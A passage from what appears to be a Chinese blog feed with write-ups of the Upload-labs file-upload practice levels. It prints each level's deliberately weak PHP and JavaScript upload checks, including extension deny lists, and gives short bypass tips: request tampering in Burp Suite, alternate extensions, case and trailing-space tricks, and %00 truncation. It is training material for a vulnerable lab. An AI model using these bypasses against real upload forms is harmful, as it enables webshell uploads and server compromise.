class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Pass-14-图片马绕过-getimagesize"><a href="#Pass-14-图片马绕过-getimagesize" class="headerlink" title="Pass-14 图片马绕过-getimagesize"></a>Pass-14 图片马绕过-getimagesize</h3><p>和上面差不多</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Pass-11-00截断&quot;&gt;&lt;a href=&quot;#Pass-11-00截断&quot; class=&quot;headerlink&quot; title=&quot;Pass-11 %00截断&quot;&gt;&lt;/a&gt;Pass-11 %00截断&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>upload-1</title>
    <link href="http://example.com/2021/03/24/upload-1/"/>
    <id>http://example.com/2021/03/24/upload-1/</id>
    <published>2021-03-24T14:24:18.000Z</published>
    <updated>2021-03-24T14:57:06.682Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Upload-labs-Pass-01-前端JS限制"><a href="#Upload-labs-Pass-01-前端JS限制" class="headerlink" title="Upload-labs Pass-01 前端JS限制"></a>Upload-labs Pass-01 前端JS限制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>getElementsByName</strong>()方法可返回带有指定名称的对象的集合，由于是数组(所有名称叫做upload_file的文件)，[0]代表取数组中的第一个元素。<br><strong>lastIndexOf</strong>()是从右向左查某个指定的字符串在字符串中最后一次出现的位置。<br><strong>substring</strong>()方法用于提取字符串中介于两个指定下标之间的字符。这里就写了一个数字，即最后一个.后面的字符，即后缀名。<br>用burpsuite更改前端JS,png改为php</p><h3 id="Pass-02-MIME检测-Content-Type"><a href="#Pass-02-MIME检测-Content-Type" class="headerlink" title="Pass-02 MIME检测-Content-Type"></a>Pass-02 MIME检测-Content-Type</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接用burpsuite改</p><p>只允许上传image/jpeg、image/png、image/gif三种图片类型，这里要注意大小写</p><h3 id="Pass-03-黑名单限制"><a href="#Pass-03-黑名单限制" class="headerlink" title="Pass-03 黑名单限制"></a>Pass-03 黑名单限制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);<span class="comment">//删除文件名</span></span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>禁止上传.asp|.aspx|.php|.jsp后缀文件</p><p>直接上传.phtml</p><h3 id="Pass-04-htaccess文件上传"><a href="#Pass-04-htaccess文件上传" class="headerlink" title="Pass-04 .htaccess文件上传"></a>Pass-04 .htaccess文件上传</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test.php.xxxx.yyy这种不认识的后缀名会从右往左依次解析，不认识就往左移一个，像这个就会当作test.php处理</p><h3 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接用大小写绕过就好了,Php</p><h3 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>缺少了$file_ext = trim($file_ext); //首尾去空这行码，导致可以空格绕过</p><h3 